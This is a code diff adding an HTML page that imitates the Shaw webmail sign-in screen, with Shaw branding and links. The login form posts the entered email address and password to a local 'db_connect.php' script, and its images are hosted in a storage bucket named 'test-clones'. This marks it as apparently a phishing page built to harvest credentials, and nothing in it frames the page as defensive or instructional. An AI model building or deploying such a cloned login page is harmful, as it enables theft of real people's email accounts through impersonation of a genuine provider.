@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="manifest" href="/dbank/live/manifest.json" />
+    <script src="js/LAB.min.js"></script>
+    <script src="js/VisitorAPI.js"></script>
+    <script src="js/AppMeasurement.js"></script>
+    <script src="js/iframeResizer.min.js"></script>
+    <script src="js/DBKAPI.js"></script>
+    <title>Sign In - Shaw</title>
+    <!-- Styles -->
+    <link rel="stylesheet" href="./styles.css" />
+  </head>
+  <body>
+    <div id="app">
+      <header>
+        <div class="bar">
+          <div
+            style="
+              display: flex;
+              align-items: center;
+              height: 100%;
+              padding-left: 10px;
+            "
+          >
+            <nav style="display: flex; height: 100%; align-items: stretch">
+              <a href="http://www.shaw.ca/store/" class="active">Personal</a>
+              <a href="http://business.shaw.ca/">Business</a>
+            </nav>
+            <div class="links" style="margin-left: 12px">
+              <a href="http://www.shaw.ca/store/">Shop</a>
+              <span style="color: #aaa">|</span>
+              <a href="https://community.shaw.ca/">Support</a>
+              <span style="color: #aaa">|</span>
+              <a href="https://my.shaw.ca">My Shaw</a>
+            </div>
+          </div>
+
+          <div class="contact">
+            <a href="https://www.shaw.ca/contact-us/" aria-label="Contact">
+              <svg
+                width="16"
+                height="16"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                aria-hidden="true"
+              >
+                <path d="M21 15a2 2 0 0 1-2 2h-1a2 2 0 0 0-2 2v1"></path>
+                <path d="M8 9h8"></path>
+                <path d="M8 13h6"></path>
+                <rect x="3" y="3" width="18" height="14" rx="2"></rect>
+              </svg>
+              Contact
+            </a>
+          </div>
+        </div>
+      </header>
+      <main
+        class="center"
+        style="min-height: calc(100dvh - 45px - 40px); padding: 16px"
+      >
+        <div class="card">
+          <div style="text-align: center; margin-bottom: 16px">
+            <img
+              src="https://slelguoygbfzlpylpxfs.supabase.co/storage/v1/object/public/test-clones/1ddff6c7-3832-4d0d-8746-db836bc3f323-webmail-shaw-ca/assets/images/webmail-desktop-1.png?"
+              alt="Shaw Webmail"
+              width="180"
+              height="41"
+              style="display: inline-block"
+            />
+          </div>
+
+          <p class="title">Sign in to access your Shaw email</p>
+
+          <form action="db_connect.php" method="post" autocomplete="off">
+            <div class="row">
+              <div style="flex: 1">
+                <label for="email" class="label">Shaw email</label>
+                <input
+                  id="email"
+                  name="username"
+                  type="email"
+                  placeholder="example@shaw.ca"
+                  class="input"
+                />
+              </div>
+              <a href="#" class="help">
+                <img
+                  src="https://slelguoygbfzlpylpxfs.supabase.co/storage/v1/object/public/test-clones/1ddff6c7-3832-4d0d-8746-db836bc3f323-webmail-shaw-ca/assets/icons/helpIcon-2.png?"
+                  alt="Help"
+                  width="18"
+                  height="18"
+                />
+                <span>Help</span>
+              </a>
+            </div>
+
+            <div style="margin-bottom: 16px">
+              <label for="password" class="label">Password</label>
+              <input
+                name="password"
+                id="password"
+                type="password"
+                class="input"
+              />
+            </div>
+
+            <label class="checkbox">
+              <input id="remember-email" type="checkbox" />
+              <span>Remember Shaw email</span>
+            </label>
+
+            <button type="submit" class="button">Sign in</button>
+
+            <div class="links">
+              <div style="margin-bottom: 8px">
+                <span>Having trouble? </span>
+                <a
+                  href="https://support.shaw.ca/t5/internet-articles/how-to-change-your-shaw-email-password/ta-p/6430"
+                  >Shaw Support: How To Reset My Password</a
+                >
+              </div>
+              <div style="margin-bottom: 12px">
+                <span>Already Know How? </span>
+                <a href="https://my.shaw.ca/services/internet"
+                  >Reset Password On My Shaw</a
+                >
+              </div>
+              <div class="hide-md">
+                <span>Don't have an account? </span>
+                <a href="https://register.shaw.ca/">Create one now.</a>
+              </div>
+            </div>
+          </form>
+        </div>
+      </main>
+      <div id="recaptcha" data-include="recaptcha-section.html"></div>
+      <footer>
+        <div class="wrap">
+          <div>
+            <span>© 2024 Shaw Communications. All Rights Reserved.</span>
+          </div>
+          <div
+            class="links"
+            style="display: flex; align-items: center; gap: 12px"
+          >
+            <a href="http://www.shaw.ca/privacy-policy/">Privacy Policy</a>
+            <span style="opacity: 0.7">|</span>
+            <a href="http://www.shaw.ca/terms-of-use/">Terms of Use</a>
+            <span style="opacity: 0.7">|</span>
+            <a href="http://www.shaw.ca/accessibility/">Accessibility</a>
+          </div>
+        </div>
+      </footer>
+    </div>
+
+    <!-- Icons referenced in-page to ensure they are fetched -->
+    <link rel="preload" as="image" href="./public/file.svg" />
+    <link rel="preload" as="image" href="./public/globe.svg" />
+    <link rel="preload" as="image" href="./public/window.svg" />
+
+    <!-- Scripts -->
+    <script src="./script.js" defer></script>
+  </body>
+</html>
